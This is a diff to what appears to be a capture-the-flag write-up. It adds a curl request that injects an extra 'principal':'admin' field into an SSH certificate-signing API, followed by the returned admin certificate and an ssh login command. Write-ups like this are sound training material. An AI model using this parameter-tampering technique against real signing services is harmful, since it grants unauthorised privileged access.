@@ -54,6 +54,28 @@ alabaster  monitor
 monitor@ssh-server-vm:/etc/ssh/auth_principals$ cat monitor 
 elf
 ```
+#### Request the SSH Certificate and pass an addtional field called princial with a value admin
+```bash
+┌──(kali㉿kali)-[~]
+└─$ curl 'https://northpole-ssh-certs-fa.azurewebsites.net/api/create-cert?code=candy-cane-twirl' \
+  -H 'authority: northpole-ssh-certs-fa.azurewebsites.net' \
+  -H 'accept: */*' \
+  -H 'accept-language: en-US,en;q=0.9' \
+  -H 'content-type: application/json' \
+  -H 'origin: https://northpole-ssh-certs-fa.azurewebsites.net' \
+  -H 'referer: https://northpole-ssh-certs-fa.azurewebsites.net/api/create-cert?code=candy-cane-twirl' \
+  -H 'sec-ch-ua: "Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"' \
+  -H 'sec-ch-ua-mobile: ?0' \
+  -H 'sec-ch-ua-platform: "Windows"' \
+  -H 'sec-fetch-dest: empty' \
+  -H 'sec-fetch-mode: cors' \
+  -H 'sec-fetch-site: same-origin' \
+  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36' \
+  --data-raw '{"ssh_pub_key":"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCcaq+/KpgibQjbqp8TgFrsG8aQefAW8UjFeMbUvCXcEvsg21UICpMxG3Ibv3hrvTG+ETDko0Wl5CFhyDSgQjODJHimtYQMCRPQGYfoMqIKl2DuMRFEyQhl4mT+2zG1jBeAK0bWd9Rm+Np88VDaFk9rffKhcSrk1omKeANs/2+6aoewAexWL70wz3POzzcuiJAzvgXBidVttLpcBAVqmvpXpz7LkfkvZq1vHdyfASAfMZe3Yv9kx+v4lsNd0nbP4HS87nc74rcYataOyTTuqS9uXBkor262qU47UdCP923uMHw0Lx60MMxs+m8OeAlO4EStZAUlln3J+ccPlFzoqjQ7xHufELXD3a7JEFcqT+wQ72TrHd1p3tqY7pM+hg3txABbuvpX3Q4ePCrzo2IY+HYq6SE+T71QwPm8Fhr7XC+SUAp1huAfCS8KHr3qQeuPYskkEHxQfblCFv+95QSDnyuaZKSrt1Ez5jmfPl17y5XGIEMaBLAGackw4Q1kZDSws98= alabaster","principal":"admin"}' \    
+  --compressed
+{"ssh_cert": "rsa-sha2-512-cert-v01@openssh.com AAAAIXJzYS1zaGEyLTUxMi1jZXJ0LXYwMUBvcGVuc3NoLmNvbQAAACcxMzk1ODc0ODc3MTMzMTM4OTk0Mzg0NDg0MDM5NTg1MTMyMzMzMzkAAAADAQABAAABgQCcaq+/KpgibQjbqp8TgFrsG8aQefAW8UjFeMbUvCXcEvsg21UICpMxG3Ibv3hrvTG+ETDko0Wl5CFhyDSgQjODJHimtYQMCRPQGYfoMqIKl2DuMRFEyQhl4mT+2zG1jBeAK0bWd9Rm+Np88VDaFk9rffKhcSrk1omKeANs/2+6aoewAexWL70wz3POzzcuiJAzvgXBidVttLpcBAVqmvpXpz7LkfkvZq1vHdyfASAfMZe3Yv9kx+v4lsNd0nbP4HS87nc74rcYataOyTTuqS9uXBkor262qU47UdCP923uMHw0Lx60MMxs+m8OeAlO4EStZAUlln3J+ccPlFzoqjQ7xHufELXD3a7JEFcqT+wQ72TrHd1p3tqY7pM+hg3txABbuvpX3Q4ePCrzo2IY+HYq6SE+T71QwPm8Fhr7XC+SUAp1huAfCS8KHr3qQeuPYskkEHxQfblCFv+95QSDnyuaZKSrt1Ez5jmfPl17y5XGIEMaBLAGackw4Q1kZDSws98AAAAAAAAAAQAAAAEAAAAkMjNmZTdjNTEtOTNmNC00NmY2LThiMWMtNzY5MDcxZGQ0OTRiAAAACQAAAAVhZG1pbgAAAABliQnMAAAAAGWt9PgAAAAAAAAAEgAAAApwZXJtaXQtcHR5AAAAAAAAAAAAAAAzAAAAC3NzaC1lZDI1NTE5AAAAIGk2GNMCmJkXPJHHRQH9+TM4CRrsq/7BL0wp+P6rCIWHAAAAUwAAAAtzc2gtZWQyNTUxOQAAAEAi7xGI4+icBbZVFyqfqTk6PRl4zWeMHBUQ4++EKaX6XjyK8TIe6wj0j80vXo81y+qP3JIqyeCgJYBt1ZyONisF ", "principal": "admin"}   
+```
+
 ```bash
 ssh alabaster@ssh-server-vm.santaworkshopgeeseislands.org -i  mysshkey.alabaster -i mysshkey.alabaster.cert -v
 ```
